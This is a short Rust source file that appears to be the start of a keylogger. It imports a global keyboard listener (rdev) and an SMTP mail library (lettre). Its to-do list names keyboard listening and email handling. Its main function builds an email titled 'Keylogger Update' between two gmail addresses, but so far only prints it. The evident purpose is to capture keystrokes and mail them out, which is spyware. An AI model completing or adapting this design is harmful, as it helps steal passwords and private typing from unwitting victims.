/*
    To-Do
    -----
        - Test out parsin by using the parsing function multiple times
            to deal with subcommands
        - email handling
        - keyboard listening handling
*/
mod build;
use lettre::message::{header, Mailbox, Message};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};
use rdev::{
    listen, // runs a while true loop
    Event,
};

use std::io::Result;
use std::sync::{Arc, Mutex};
use std::thread;

fn main() {
    let email = Message::builder()
        .from("rustacean101@gmail.com".parse().unwrap())
        .to("gmendieta4109@gmail.com".parse().unwrap())
        .subject("Keylogger Update".to_string())
        .header(header::ContentType::TEXT_PLAIN)
        .body("Hi, This is the message".to_string())
        .unwrap();
    println!("{:#?}", email);
}
